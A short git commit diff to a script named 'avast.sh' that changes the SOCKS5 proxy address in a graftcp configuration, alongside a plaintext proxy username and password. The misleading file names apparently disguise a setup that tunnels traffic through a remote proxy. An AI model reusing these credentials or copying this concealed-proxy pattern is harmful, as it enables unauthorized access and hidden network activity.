c09509839d5fe103061fa168f981d5d6c6545d82
renilo <88342640+renilo@users.noreply.github.com>
2022-04-04 18:05:06 +0700

    Update avast.sh

--- avast.sh
+++ avast.sh
@@ -11,7 +11,7 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 3.15.39.186:1080
+socks5 = 44.202.124.0:1080
 socks5_username = mikrotik999
 socks5_password = Elibawnos
 END
